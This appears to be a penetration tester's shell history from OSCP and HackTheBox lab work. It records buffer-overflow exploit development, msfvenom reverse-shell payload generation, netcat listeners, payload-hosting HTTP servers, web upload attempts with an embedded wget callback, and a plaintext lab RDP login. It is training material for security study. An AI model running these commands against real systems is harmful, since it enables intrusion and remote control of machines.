 8691  2020-11-28 11:53  l
 8692  2020-11-28 11:54  cherrytree ~/OSCP/dev_dept/results/10.2.2.23/report/adam.ctb
 8693  2020-11-28 11:54  l
 8694  2020-11-28 11:54  cd ..
 8695  2020-11-28 11:54  l
 8696  2020-11-28 11:54  cherrytree ~/OSCP/dev_dept/10.3.3.31
 8697  2020-11-28 11:54  l
 8698  2020-11-28 11:55  cherrytree ~/OSCP/dev_dept/10.2.2.86/report/john.ctb
 8699  2020-11-28 11:56  cherrytree ~/OSCP/dev_dept/10.2.2.150/report/adam.ctb
 8700  2020-11-28 11:57  l
 8701  2020-11-28 11:57  cd
 8702  2020-11-28 11:57  l
 8703  2020-11-28 11:57  ll
 8704  2020-11-28 11:57  cd HTB/
 8705  2020-11-28 11:57  l
 8706  2020-11-28 11:57  cd results
 8707  2020-11-28 11:57  l
 8708  2020-11-28 11:57  cd ,,
 8709  2020-11-28 11:57  l
 8710  2020-11-28 11:58  cd 10.10.10.13
 8711  2020-11-28 11:58  l
 8712  2020-11-28 11:58  cd exploit
 8713  2020-11-28 11:58  l
 8714  2020-11-28 11:59  sudo python -m SimpleHTTPServer 80
 8715  2020-11-28 12:00  l
 8716  2020-11-28 12:01  cp ~/OSCP/dev_dept/10.2.2.150/exploits/php-reverse-shell.php ./
 8717  2020-11-28 12:01  l
 8718  2020-11-28 12:01  vim php-reverse-shell.php
 8719  2020-11-28 12:01  sudo python -m SimpleHTTPServer 80
 8720  2020-11-28 12:01  l
 8721  2020-11-28 12:01  rm lol.sh
 8722  2020-11-28 12:01  sudo python -m SimpleHTTPServer 80
 8723  2020-11-28 12:06  exit
 8724  2020-11-28 12:07  tmux new -s HTB
 8725  2020-11-28 12:07  sudo rlwrap nc -lnvp 443
 8726  2020-11-28 21:00  l
 8727  2020-11-28 21:00  cd ..
 8728  2020-11-28 21:00  ls
 8729  2020-11-28 21:00  cd results
 8730  2020-11-28 21:00  l
 8731  2020-11-28 21:00  cd 10.10.10.13
 8732  2020-11-28 21:00  l
 8733  2020-11-28 21:00  cd exploit
 8734  2020-11-28 21:00  l
 8735  2020-11-28 21:01  rm php-reverse-shell.php
 8736  2020-11-28 21:01  touch rshell.sh
 8737  2020-11-28 21:01  vim rshell.sh
 8738  2020-11-28 21:03  chmod +x rshell.sh
 8739  2020-11-28 21:03  l;
 8740  2020-11-28 21:03  sudo python -m SimpleHTTPServer 80
 8741  2020-11-28 21:03  ip a
 8742  2020-11-28 21:03  sudo python -m SimpleHTTPServer 80
 8743  2020-11-28 21:06  l
 8744  2020-11-28 21:06  cat rshell.sh
 8745  2020-11-28 21:08  l
 8746  2020-11-28 21:09  stty raw -echo
 8747  2020-11-28 21:09  fg
 8748  2020-11-28 21:10  cd ..
 8749  2020-11-28 21:10  l
 8750  2020-11-28 21:10  cd linux_priv_esc_scripts
 8751  2020-11-28 21:10  l
 8752  2020-11-28 21:10  sudo python -m SimpleHTTPServer 80
 8753  2020-11-28 21:35  fg
 8754  2020-11-28 21:36  sudo rlwrap nc -lnvp 443
 8755  2020-11-28 21:36  stty raw -echo
 8756  2020-11-28 21:36  fg
 8757  2020-11-28 21:59  stty raw -echo
 8758  2020-11-28 21:59  fg
 8759  2020-11-28 21:59  sudo rlwrap nc -lnvp 443
 8760  2020-11-28 22:01  ping 10.10.10.13
 8761  2020-11-28 22:02  ps aux | grep firefox
 8762  2020-11-28 22:02  sudo kill -9 20479
 8763  2020-11-28 22:02  sudo kill -9 6112
 8764  2020-11-28 22:02  ps aux | grep firefox
 8765  2020-11-28 22:03  ps aux 
 8766  2020-11-28 22:03  ps aux | grep fire
 8767  2020-11-28 22:05  exit
 8768  2020-11-28 22:41  stty raw -echo
 8769  2020-11-28 22:41  fg
 8770  2020-11-28 22:42  sudo rlwrap nc -lnvp 443
 8771  2020-11-28 22:44  stty raw -echo
 8772  2020-11-28 22:44  fg
 8773  2020-11-28 22:45  cd ..
 8774  2020-11-28 22:45  l
 8775  2020-11-28 22:45  cd results
 8776  2020-11-28 22:45  l
 8777  2020-11-28 22:45  cd 10.10.10.13
 8778  2020-11-28 22:45  l
 8779  2020-11-28 22:45  cd exploit
 8780  2020-11-28 22:45  l
 8781  2020-11-28 22:45  touch phpshell.php
 8782  2020-11-28 22:45  vim phpshell.php
 8783  2020-11-28 22:48  sudo python -m SimpleHTTPServer 80
 8784  2020-11-28 22:48  sudo rlwrap nc -lnvp 1234
 8785  2020-11-28 23:07  exit
 8786  2020-11-28 23:07  l
 8787  2020-11-28 23:07  ll
 8788  2020-11-28 23:07  cd
 8789  2020-11-29 09:58  ls
 8790  2020-11-29 09:58  l
 8791  2020-11-29 09:58  ll
 8792  2020-11-29 09:58  cd oscpdata/p0wny-shell
 8793  2020-11-29 09:58  cd
 8794  2020-11-29 09:58  cd oscP
 8795  2020-11-29 09:58  cd OSCP
 8796  2020-11-29 09:58  l
 8797  2020-11-29 09:58  cd 10
 8798  2020-11-29 09:58  l
 8799  2020-11-29 09:58  cd results
 8800  2020-11-29 09:58  l
 8801  2020-11-29 09:58  cd 10.11.1.10
 8802  2020-11-29 09:58  l
 8803  2020-11-29 09:58  cd exploit
 8804  2020-11-29 09:58  l
 8805  2020-11-29 09:58  cd ..
 8806  2020-11-29 09:58  l
 8807  2020-11-29 09:58  cd report
 8808  2020-11-29 09:58  l
 8809  2020-11-29 09:58  cherrytree 10.11.1.10.ctb
 8810  2020-11-29 10:01  l
 8811  2020-11-29 10:01  ll
 8812  2020-11-29 10:01  cd ..
 8813  2020-11-29 10:01  l
 8814  2020-11-29 10:01  cd report
 8815  2020-11-29 10:01  l;
 8816  2020-11-29 10:01  cherrytree 10.11.1.10.ctb
 8817  2020-11-29 10:02  cd ~/OSCP/10/results/10.11.1.10/report
 8818  2020-11-29 10:02  l
 8819  2020-11-29 10:02  xdg-open  10.11.1.10--Enumeration--Web_Services--HTTP.pdf
 8820  2020-11-29 10:07  l
 8821  2020-11-29 10:07  cd ..
 8822  2020-11-29 10:07  l
 8823  2020-11-29 10:07  cd ..
 8824  2020-11-29 10:07  l
 8825  2020-11-29 10:07  cd ..
 8826  2020-11-29 10:07  l
 8827  2020-11-29 10:07  cd 8/
 8828  2020-11-29 10:07  ;
 8829  2020-11-29 10:07  l
 8830  2020-11-29 10:07  cherrytree labport.5.ctb
 8831  2020-11-29 10:08  l
 8832  2020-11-29 10:08  cd tmp
 8833  2020-11-29 10:08  l
 8834  2020-11-29 10:08  cd ..
 8835  2020-11-29 10:08  l
 8836  2020-11-29 10:08  cd ..
 8837  2020-11-29 10:08  l
 8838  2020-11-29 10:08  cd 13
 8839  2020-11-29 10:08  l
 8840  2020-11-29 10:08  cd results
 8841  2020-11-29 10:08  l
 8842  2020-11-29 10:08  cd 10.11.1.13
 8843  2020-11-29 10:08  l
 8844  2020-11-29 10:08  cd report
 8845  2020-11-29 10:08  l
 8846  2020-11-29 10:09  cherrytree 13.ctb
 8847  2020-11-29 19:06  kl
 8848  2020-11-29 19:06  l
 8849  2020-11-29 19:08  sudo Autorecon
 8850  2020-11-29 19:08  sudo autorecon
 8851  2020-11-29 19:08  autorcon
 8852  2020-11-29 19:08  autorecon
 8853  2020-11-29 19:08  sudo apt instal autorecon
 8854  2020-11-29 19:08  sudo apt install autorecon
 8855  2020-11-29 19:22  l
 8856  2020-11-29 19:22  cd ..
 8857  2020-11-29 19:22  l
 8858  2020-11-29 19:22  cd ..
 8859  2020-11-29 19:22  l
 8860  2020-11-29 19:22  cd ..
 8861  2020-11-29 19:22  l
 8862  2020-11-29 19:22  cd ..
 8863  2020-11-29 19:22  l
 8864  2020-11-29 19:22  cd results
 8865  2020-11-29 19:22  l
 8866  2020-11-29 19:23  cd 10.11.1.31
 8867  2020-11-29 19:23  l
 8868  2020-11-29 19:23  cd report
 8869  2020-11-29 19:23  l
 8870  2020-11-29 19:23  cherrytree .31ctb.ctb
 8871  2020-11-29 19:26  cd ..
 8872  2020-11-29 19:26  l
 8873  2020-11-29 19:26  cd ..
 8874  2020-11-29 19:26  k
 8875  2020-11-29 19:26  l
 8876  2020-11-29 19:26  cd 10.11.1.35
 8877  2020-11-29 19:26  l
 8878  2020-11-29 19:26  cd scans
 8879  2020-11-29 19:26  l
 8880  2020-11-29 19:26  cd ..
 8881  2020-11-29 19:26  l
 8882  2020-11-29 19:26  cd report
 8883  2020-11-29 19:26  kl
 8884  2020-11-29 19:26  l
 8885  2020-11-29 19:26  cd ..
 8886  2020-11-29 19:26  l
 8887  2020-11-29 19:26  cd ..
 8888  2020-11-29 19:27  l
 8889  2020-11-29 19:27  cd 10.11.1.39
 8890  2020-11-29 19:27  l
 8891  2020-11-29 19:27  cd report
 8892  2020-11-29 19:27  l
 8893  2020-11-29 19:27  cherrytree CTF_template.ctb
 8894  2020-11-29 19:27  l
 8895  2020-11-29 19:27  cd ..
 8896  2020-11-29 19:27  l
 8897  2020-11-29 19:27  cd ..
 8898  2020-11-29 19:27  l
 8899  2020-11-29 19:28  cd 10.11.1.50
 8900  2020-11-29 19:28  l
 8901  2020-11-29 19:28  cd report
 8902  2020-11-29 19:28  l
 8903  2020-11-29 19:28  cherrytree 50.ctb
 8904  2020-11-29 19:34  l
 8905  2020-11-29 19:34  cd ..
 8906  2020-11-29 19:34  l
 8907  2020-11-29 19:34  cd //
 8908  2020-11-29 19:34  cd ~/OSCP/results/10.11.1.50
 8909  2020-11-29 19:34  l
 8910  2020-11-29 19:34  cd ..
 8911  2020-11-29 19:34  l
 8912  2020-11-29 19:37  exit
 8913  2020-11-29 19:37  cd 10.11.1.73l
 8914  2020-11-29 19:37  cd 10.11.1.73
 8915  2020-11-29 19:37  l
 8916  2020-11-29 19:37  cd exploit
 8917  2020-11-29 19:37  l
 8918  2020-11-29 19:37  cd ..
 8919  2020-11-29 19:37  l
 8920  2020-11-29 19:37  cd report
 8921  2020-11-29 19:37  l
 8922  2020-11-29 19:37  cherrytree Gamma.ctb
 8923  2020-11-29 19:46  cd ..
 8924  2020-11-29 19:46  kl
 8925  2020-11-29 19:46  l
 8926  2020-11-29 19:46  cd exploit
 8927  2020-11-29 19:46  l
 8928  2020-11-29 19:46  cd ..
 8929  2020-11-29 19:46  l
 8930  2020-11-29 19:46  cd ..
 8931  2020-11-29 19:46  l
 8932  2020-11-29 19:49  cd 10.11.1.75l
 8933  2020-11-29 19:49  cd 10.11.1.75
 8934  2020-11-29 19:49  l
 8935  2020-11-29 19:49  cd report/l
 8936  2020-11-29 19:49  cd report
 8937  2020-11-29 19:49  l
 8938  2020-11-29 19:49  cd .
 8939  2020-11-29 19:49  cd ..
 8940  2020-11-29 19:49  l
 8941  2020-11-29 19:49  cd 10.11.1.101
 8942  2020-11-29 19:49  l
 8943  2020-11-29 19:49  cd exploit
 8944  2020-11-29 19:49  l
 8945  2020-11-29 19:50  cd ..
 8946  2020-11-29 19:50  l
 8947  2020-11-29 19:50  cd ..
 8948  2020-11-29 19:50  l
 8949  2020-11-29 19:50  cd 10.11.1.115
 8950  2020-11-29 19:50  l
 8951  2020-11-29 19:50  cd report
 8952  2020-11-29 19:50  l
 8953  2020-11-29 19:50  cherrytree tophat.acme.com.115.ctb
 8954  2020-11-29 19:51  l
 8955  2020-11-29 19:51  cd ..
 8956  2020-11-29 19:51  kl
 8957  2020-11-29 19:51  cd ..
 8958  2020-11-29 19:51  l
 8959  2020-11-29 19:51  cd 10.11.1.116
 8960  2020-11-29 19:51  l
 8961  2020-11-29 19:51  cd report
 8962  2020-11-29 19:51  l
 8963  2020-11-29 19:51  cherrytree dotty.ctb
 8964  2020-11-29 19:51  cd ..
 8965  2020-11-29 19:51  kl
 8966  2020-11-29 19:51  l
 8967  2020-11-29 19:52  cd ..
 8968  2020-11-29 19:52  l
 8969  2020-11-29 19:52  cd 10.11.1.118
 8970  2020-11-29 19:52  l
 8971  2020-11-29 19:52  cd report
 8972  2020-11-29 19:52  l
 8973  2020-11-29 19:52  cd ..
 8974  2020-11-29 19:52  l
 8975  2020-11-29 19:52  cd 10.11.1.141
 8976  2020-11-29 19:52  l
 8977  2020-11-29 19:52  cd report
 8978  2020-11-29 19:52  l
 8979  2020-11-29 19:52  cherrytree fc4.ctb
 8980  2020-11-29 19:52  cd ..
 8981  2020-11-29 19:52  kll
 8982  2020-11-29 19:52  cd ..
 8983  2020-11-29 19:52  l
 8984  2020-11-29 19:53  cd 10.11.1.146
 8985  2020-11-29 19:53  l
 8986  2020-11-29 19:53  cd report
 8987  2020-11-29 19:53  l
 8988  2020-11-29 19:53  cherrytree susie.ctb
 8989  2020-11-30 07:52  ping  10.10.10.100
 8990  2020-11-30 07:52  ip a
 8991  2020-11-30 07:53  ping  10.10.10.97
 8992  2020-11-30 07:53  ping  10.10.10.192
 8993  2020-11-30 07:53  cd ..
 8994  2020-11-30 07:53  l
 8995  2020-11-30 07:53  cd
 8996  2020-11-30 07:53  cd HTB
 8997  2020-11-30 07:53  l
 8998  2020-11-30 07:53  cd results
 8999  2020-11-30 07:53  l
 9000  2020-11-30 07:57  cd ..
 9001  2020-11-30 07:57  ./create_direcotry.sh  10.10.10.192
 9002  2020-11-30 07:57  cd results
 9003  2020-11-30 07:57  cd  10.10.10.192
 9004  2020-11-30 07:57  l
 9005  2020-11-30 07:57  cd exploit
 9006  2020-11-30 07:57  cd ..
 9007  2020-11-30 07:57  l
 9008  2020-11-30 07:57  cd scans
 9009  2020-11-30 07:57  l
 9010  2020-11-30 07:57  nmap -sCV -oA topports  10.10.10.192
 9011  2020-11-30 07:58  nmap -sCV -Pn  -oA topports  10.10.10.192
 9012  2020-11-30 08:02  ping  10.10.10.134
 9013  2020-12-01 02:22  l
 9014  2020-12-01 02:22  cd ..
 9015  2020-12-01 02:22  l
 9016  2020-12-01 02:22  cd ..
 9017  2020-12-01 02:22  l
 9018  2020-12-01 02:22  cd ..
 9019  2020-12-01 02:22  l
 9020  2020-12-01 02:22  cd oscP
 9021  2020-12-01 02:22  cd OSCP
 9022  2020-12-01 02:22  l
 9023  2020-12-01 02:22  cd results
 9024  2020-12-01 02:22  l
 9025  2020-12-05 22:47  sudo -s
 9026  2020-12-05 22:58  ip a
 9027  2020-12-05 23:00  ping 192.168.35.87
 9028  2020-12-05 23:00  tmux new -s HTB
 9029  2020-12-05 23:01  exit
 9030  2020-12-05 23:02  cd Desktop
 9031  2020-12-05 23:02  ls
 9032  2020-12-05 23:02  ./troubleshooting.sh
 9033  2020-12-05 23:02  sudo -s
 9034  2020-12-05 23:02  ls -al
 9035  2020-12-05 23:02  bash troubleshooting.sh
 9036  2020-12-05 23:02  sudo -s
 9037  2020-12-05 23:07  192.168.35.110
 9038  2020-12-05 23:08  rdesktop -u admin -p lab  192.168.35.110
 9039  2020-12-05 23:08  ip a
 9040  2020-12-05 23:12  ne 
 9041  2020-12-05 23:12  ip a
 9042  2020-12-05 23:13  rdesktop -u admin -p lab  192.168.35.111
 9043  2020-12-05 23:15  ip a
 9044  2020-12-05 23:15  mkdir OSCP_Exam
 9045  2020-12-05 23:15  cd OSCP_Exam
 9046  2020-12-05 23:15  l
 9047  2020-12-05 23:16  sudo -s
 9048  2020-12-05 23:16  which autorecon
 9049  2020-12-05 23:16  sudo -s
 9050  2020-12-05 23:25  cd
 9051  2020-12-05 23:25  cd OSCP_Exam
 9052  2020-12-05 23:25  l
 9053  2020-12-05 23:25  touch BOF
 9054  2020-12-05 23:25  mkdir BOF 
 9055  2020-12-05 23:25  ls
 9056  2020-12-05 23:25  rm BOF
 9057  2020-12-05 23:25  mkdir BOF
 9058  2020-12-05 23:25  cd BOF
 9059  2020-12-05 23:25  ls
 9060  2020-12-05 23:25  touch exploit.py
 9061  2020-12-05 23:25  rdesktop -u admin -p lab  192.168.35.111
 9062  2020-12-05 23:26  cd OSCP_Exam
 9063  2020-12-05 23:26  ls
 9064  2020-12-05 23:26  cd BOF
 9065  2020-12-05 23:26  l
 9066  2020-12-05 23:26  vim exploit.py
 9067  2020-12-05 23:27  chmod +x exploit.py
 9068  2020-12-05 23:30  vim exploit.py
 9069  2020-12-05 23:30  python exploit.py
 9070  2020-12-05 23:30  vim exploit.py
 9071  2020-12-05 23:30  python exploit.py
 9072  2020-12-05 23:30  vim exploit.py
 9073  2020-12-05 23:30  python exploit.py
 9074  2020-12-05 23:30  vim exploit.py
 9075  2020-12-05 23:30  python exploit.py
 9076  2020-12-05 23:30  vim exploit.py
 9077  2020-12-05 23:31  python exploit.py
 9078  2020-12-05 23:31  python exploit.py 192.168.35.111
 9079  2020-12-05 23:33  vim exploit.py
 9080  2020-12-05 23:35  rdesktop -u admin -p lab  192.168.35.111
 9081  2020-12-05 23:35  vim exploit.py
 9082  2020-12-05 23:38  touch fuzzing.py
 9083  2020-12-05 23:38  vim fuzzing.py
 9084  2020-12-05 23:39  cat exploit.py
 9085  2020-12-05 23:39  python exploit.py 192.168.35.111
 9086  2020-12-05 23:39  vim fuzzing.py
 9087  2020-12-05 23:39  cat exploit.py
 9088  2020-12-05 23:39  vim fuzzing.py
 9089  2020-12-05 23:39  cat exploit.py
 9090  2020-12-05 23:40  vim fuzzing.py
 9091  2020-12-05 23:40  rdesktop -u admin -p lab  192.168.35.111
 9092  2020-12-05 23:41  python fuzzing.py
 9093  2020-12-05 23:41  vim  fuzzing.py
 9094  2020-12-05 23:43  python fuzzing.py
 9095  2020-12-05 23:43  vim  fuzzing.py
 9096  2020-12-05 23:43  python fuzzing.py
 9097  2020-12-05 23:44  vim  fuzzing.py
 9098  2020-12-05 23:44  vim exploit.py
 9099  2020-12-05 23:45  /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
 9100  2020-12-05 23:45  vim exploit.py
 9101  2020-12-05 23:50  /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
 9102  2020-12-05 23:50  vim exploit.py
 9103  2020-12-05 23:52  rdesktop -u admin -p lab  192.168.35.111
 9104  2020-12-05 23:52  python exploit.py
 9105  2020-12-05 23:53  python exploit.py 192.168.35.111
 9106  2020-12-05 23:53  38784237
 9107  2020-12-05 23:54  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 38784237
 9108  2020-12-05 23:54  vim exploit.py
 9109  2020-12-05 23:58  python exploit.py 192.168.35.111
 9110  2020-12-05 23:59  vim exploit.py
 9111  2020-12-06 00:01  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"\n"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"\n"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"\n"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"\n"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"\n"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"\n"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"\n"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"\n
 9112  2020-12-06 00:01  vim exploit.py
 9113  2020-12-06 00:04  python exploit.py 192.168.35.111
 9114  2020-12-06 00:05  vim exploit.py
 9115  2020-12-06 00:05  python exploit.py 192.168.35.111
 9116  2020-12-06 00:06  vim exploit.py
 9117  2020-12-06 00:07  python exploit.py 192.168.35.111
 9118  2020-12-06 00:10  vim exploit.py
 9119  2020-12-06 00:11  python exploit.py 192.168.35.111
 9120  2020-12-06 00:12  vim exploit.py
 9121  2020-12-06 00:13  python exploit.py 192.168.35.111
 9122  2020-12-06 00:14  vim exploit.py
 9123  2020-12-06 00:14  python exploit.py 192.168.35.111
 9124  2020-12-06 00:15  vim exploit.py
 9125  2020-12-06 00:16  python exploit.py 192.168.35.111
 9126  2020-12-06 00:17  vim exploit.py
 9127  2020-12-06 00:17  python exploit.py 192.168.35.111
 9128  2020-12-06 00:18  vim exploit.py
 9129  2020-12-06 00:19  python exploit.py 192.168.35.111
 9130  2020-12-06 00:19  vim exploit.py
 9131  2020-12-06 00:20  python exploit.py 192.168.35.111
 9132  2020-12-06 00:27  vim exploit.py
 9133  2020-12-06 00:34  "\x00\x04\x76\x77\x99\xf3"
 9134  2020-12-06 00:35  #msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00\x04\x76\x77\x99\xf3" -f py
 9135  2020-12-06 00:35  ip a
 9136  2020-12-06 00:35  #msfvenom -p windows/shell_reverse_tcp LHOST=192.168.19.35 LPORT=443 EXITFUNC=thread -b "\x00\x04\x76\x77\x99\xf3" -f py
 9137  2020-12-06 00:35  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.19.35 LPORT=443 EXITFUNC=thread -b "\x00\x04\x76\x77\x99\xf3" -f py
 9138  2020-12-06 00:38  vim exploit.py
 9139  2020-12-06 00:39  {{\n
 9140  2020-12-06 00:39  vim exploit.py
 9141  2020-12-06 00:44  sudo nc -nlvp 443
 9142  2020-12-06 00:44  python exploit.py 192.168.35.111
 9143  2020-12-06 00:45  vim exploit.py
 9144  2020-12-06 00:46  python exploit.py 192.168.35.111
 9145  2020-12-06 00:46  vim exploit.py
 9146  2020-12-06 00:47  cat exploit.py
 9147  2020-12-06 00:47  vim exploit.py
 9148  2020-12-06 00:49  ping 192.168.35.110
 9149  2020-12-06 00:49  ping 192.168.35.111
 9150  2020-12-06 00:49  ping 192.168.35.113
 9151  2020-12-06 00:51  ping 192.168.35.110
 9152  2020-12-06 00:52  sudo nc -nlvp 443
 9153  2020-12-06 00:52  python exploit.py 192.168.35.110
 9154  2020-12-06 01:17  ls
 9155  2020-12-06 01:17  cd results
 9156  2020-12-06 01:17  l
 9157  2020-12-06 01:17  cd 192.168.35.86
 9158  2020-12-06 01:17  l
 9159  2020-12-06 01:18  cd report
 9160  2020-12-06 01:18  l;
 9161  2020-12-06 01:18  cd ..
 9162  2020-12-06 01:18  l
 9163  2020-12-06 01:18  cd scans
 9164  2020-12-06 01:18  l
 9165  2020-12-06 01:18  cat tcp_7080_http_gobuster.txt
 9166  2020-12-06 01:18  l
 9167  2020-12-06 01:18  cat V
 9168  2020-12-06 01:18  cat tcp_80_http_index.html
 9169  2020-12-06 01:19  l
 9170  2020-12-06 01:19  cat _top_20_udp_nmap.txt
 9171  2020-12-06 01:19  ls
 9172  2020-12-06 01:19  l
 9173  2020-12-06 01:20  searchsploit Pic-A-Point
 9174  2020-12-06 01:20  searchsploit -x php/webapps/47427.txt
 9175  2020-12-06 01:22  searchsploit -x php file
 9176  2020-12-06 01:22  searchsploit -x PHP file
 9177  2020-12-06 01:22  searchsploit -x file manager
 9178  2020-12-06 01:22  searchsploit -x php manager
 9179  2020-12-06 01:22  searchsploit -x phpmanager
 9180  2020-12-06 01:22  searchsploit  php file manager
 9181  2020-12-06 01:24  #wfuzz -c -w ./winlfi2.txt -u http://192.168.35.86:7080/ft2.php\?dir\=FUZZ  --hw 235,234,236,237,238
 9182  2020-12-06 01:24  cd 
 9183  2020-12-06 01:24  cd OSCP
 9184  2020-12-06 01:24  ls
 9185  2020-12-06 01:24  cd dev_dept
 9186  2020-12-06 01:24  ls
 9187  2020-12-06 01:24  cd 10.2.2.150
 9188  2020-12-06 01:24  l
 9189  2020-12-06 01:24  cd report
 9190  2020-12-06 01:24  l
 9191  2020-12-06 01:24  cd ..
 9192  2020-12-06 01:25  l
 9193  2020-12-06 01:25  cd 10.2.2.86
 9194  2020-12-06 01:25  l
 9195  2020-12-06 01:25  cd scans
 9196  2020-12-06 01:25  l
 9197  2020-12-06 01:25  cd ..
 9198  2020-12-06 01:25  l
 9199  2020-12-06 01:26  ip a
 9200  2020-12-06 01:26  sudo python -m SimpleHTTPServer 80
 9201  2020-12-06 01:27  sudo lsof -iTCP:80 -sTCP:LISTEN\n
 9202  2020-12-06 01:27  sudo kill -9 657
 9203  2020-12-06 01:27  sudo python -m SimpleHTTPServer 80
 9204  2020-12-06 01:28  searchsploit  php file manager
 9205  2020-12-06 01:29  sudo python -m SimpleHTTPServer 80
 9206  2020-12-06 01:30  ip a
 9207  2020-12-06 01:30  sudo python -m SimpleHTTPServer 80
 9208  2020-12-06 01:31  ls
 9209  2020-12-06 01:31  l
 9210  2020-12-06 01:31  cat tcp_80_http_nikto.txt
 9211  2020-12-06 01:33  ls
 9212  2020-12-06 01:33  l
 9213  2020-12-06 01:33  cat _top_20_udp_nmap.txt
 9214  2020-12-06 01:33  l
 9215  2020-12-06 01:33  cat tcp_80_http_robots.txt
 9216  2020-12-06 01:34  searchsploit Pic-A-Point
 9217  2020-12-06 02:11  l
 9218  2020-12-06 02:14  cat tcp_7080_http_whatweb.txt
 9219  2020-12-06 02:14  searchsploit File Thingie 2.5.8
 9220  2020-12-06 02:14  searchsploit File Thingie
 9221  2020-12-06 02:15  searchsploit -x php/webapps/47349.txt
 9222  2020-12-06 02:15  searchsploit -m php/webapps/47349.txt
 9223  2020-12-06 02:15  l
 9224  2020-12-06 02:15  sudo searchsploit -m php/webapps/47349.txt
 9225  2020-12-06 02:15  l
 9226  2020-12-06 02:15  vim 47349.txt
 9227  2020-12-06 02:18  cat tcp_7080_http_whatweb.txt
 9228  2020-12-06 02:28  ip a
 9229  2020-12-06 02:28  sudo tcpdump  -i tun0
 9230  2020-12-06 02:30  sudo python -m SimpleHTTPServer 80
 9231  2020-12-06 02:31  sudo tcpdump  -i tun0
 9232  2020-12-06 02:37  sudo python -m SimpleHTTPServer 80
 9233  2020-12-06 02:38  l
 9234  2020-12-06 02:38  scat tcp_7080_http_nikto.txt
 9235  2020-12-06 02:38  cat tcp_7080_http_nikto.txt
 9236  2020-12-06 02:40  sudo python -m SimpleHTTPServer 80
 9237  2020-12-06 02:41  touch test
 9238  2020-12-06 02:41  sudo touch test
 9239  2020-12-06 02:41  l
 9240  2020-12-06 02:41  vim 47349.txt
 9241  2020-12-06 02:43  curl -u admin -X PUST "http://192.168.35.86:7080/ft2.php\?dir\=/192.168.19.35/" "/home/kali/OSCP_Exam/results/192.168.35.86/scans/test"
 9242  2020-12-06 02:44  curl -u admin -X PUST "http://192.168.35.86:7080/ft2.php\?dir\=" "/home/kali/OSCP_Exam/results/192.168.35.86/scans/test"
 9243  2020-12-06 02:44  curl -u admin -X PUST "http://192.168.35.86:7080/ft2.php" "/home/kali/OSCP_Exam/results/192.168.35.86/scans/test"
 9244  2020-12-06 02:46  curl -u admin -X PUST "http://192.168.35.86:7080/ft2.php\?dir\=/192.168.19.35/" "/home/kali/OSCP_Exam/results/192.168.35.86/scans/test"
 9245  2020-12-06 02:46  curl -u admin -X PUST "http://192.168.35.86:7080/ft2.php\?dir\=/192.168.19.35" "/home/kali/OSCP_Exam/results/192.168.35.86/scans/test"
 9246  2020-12-06 02:46  curl -u admin -X PUST "http://192.168.35.86:7080/ft2.php" "/home/kali/OSCP_Exam/results/192.168.35.86/scans/test"
 9247  2020-12-06 02:47  curl -u admin -X POST "http://192.168.35.86:7080/ft2.php" "/home/kali/OSCP_Exam/results/192.168.35.86/scans/test"
 9248  2020-12-06 02:48  curl -u admin -X PUT "http://192.168.35.86:7080/ft2.php" "/home/kali/OSCP_Exam/results/192.168.35.86/scans/test"
 9249  2020-12-06 02:50  ls
 9250  2020-12-06 02:50  l
 9251  2020-12-06 02:50  cat tcp_7080_http_nikto.txt
 9252  2020-12-06 02:51  l
 9253  2020-12-06 02:51  cat tcp_7080_http_robots.txt
 9254  2020-12-06 02:51  cat tcp_7080_http_gobuster.txt
 9255  2020-12-06 02:55  #curl -F ‘data=@path/to/local/file’ UPLOAD_ADDRESS
 9256  2020-12-06 02:55  l
 9257  2020-12-06 02:56  curl -F ‘data=@/home/kali/OSCP_Exam/results/192.168.35.86/scans/test’ http://192.168.35.86:7080/ft2.php\?dir\=/192.168.19.35/wget%20192.168.19.35
 9258  2020-12-06 02:57  curl -F ‘data=@/home/kali/OSCP_Exam/results/192.168.35.86/scans/test’ http://192.168.35.86:7080
 9259  2020-12-06 02:57  curl -F ‘data=@/home/kali/OSCP_Exam/results/192.168.35.86/scans/test’ http://192.168.35.86:7080/
 9260  2020-12-06 02:57  pwd
 9261  2020-12-06 02:57  sudo curl -F ‘data=@/home/kali/OSCP_Exam/results/192.168.35.86/scans/test’ http://192.168.35.86:7080/
 9262  2020-12-06 02:57  sudo -i
 9263  2020-12-06 02:58  l
 9264  2020-12-06 03:04  locate / | grep webshells
 9265  2020-12-06 03:05  cd /home/kali/HTB/results/10.10.10.194/exploit/webshell/JohnTroony/php-webshells
 9266  2020-12-06 03:05  ls
